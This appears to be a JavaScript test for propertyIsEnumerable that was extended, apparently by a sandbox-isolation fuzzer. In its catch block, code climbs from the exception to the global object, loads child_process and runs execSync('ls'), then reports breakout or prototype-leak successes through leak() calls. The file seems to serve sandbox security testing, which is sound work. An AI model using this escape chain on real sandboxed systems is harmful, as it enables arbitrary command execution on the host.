try {
    if (typeof Object.prototype.propertyIsEnumerable !== 'function') {
        $ERROR('#1: propertyIsEnumerable method is defined');
    }
    var obj = { the_property: true };
    if (typeof obj.propertyIsEnumerable !== 'function') {
        $ERROR('#2: propertyIsEnumerable method is accessed');
    }
    if (!obj.propertyIsEnumerable('the_property')) {
        $ERROR('#3: propertyIsEnumerable method works properly');
    }
    var accum = '';
    for (var prop in obj) {
        accum += prop;
    }
    if (accum.indexOf('the_property') !== 0) {
        $ERROR('#4: enumerating works properly');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}